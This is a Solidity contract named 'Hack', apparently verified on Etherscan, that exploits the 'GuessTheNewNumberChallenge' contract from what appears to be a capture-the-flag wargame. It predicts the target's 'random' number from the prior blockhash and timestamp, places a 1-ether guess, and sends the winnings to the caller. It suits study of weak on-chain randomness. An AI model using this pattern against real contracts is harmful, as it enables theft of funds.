/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface GuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract Hack {
    address public otherAddr = 0x027406f738f7Dd6E78E1727510a7EAF9b0FAFC30;
    bytes func1;
    bytes func2;
    constructor() {
        func1 = abi.encodeWithSignature("guess(uint8 n)");
        func2 = abi.encodeWithSignature("isComplete()");
    }

    function GetFunc1() public view returns (bytes memory){
        return func1;
    }

    function GetFunc2() public view returns (bytes memory){
        return func2;
    }

    function GetEth() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function checkComp() public view returns (bool){
        return GuessTheNewNumberChallenge(otherAddr).isComplete();
    }

    function AddEth() public payable {
    }

    function GuessOther() public payable {
        uint tmp = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        uint8 answer = uint8(tmp);
        GuessTheNewNumberChallenge(otherAddr).guess{value : 1 ether}(answer);
        //(bool ret, bytes memory data) = (address(otherAddr)).call{value : 1 ether}(abi.encodePacked(func1, answer));
        //require(ret);
        payable(msg.sender).transfer(address(this).balance);
    }

    
}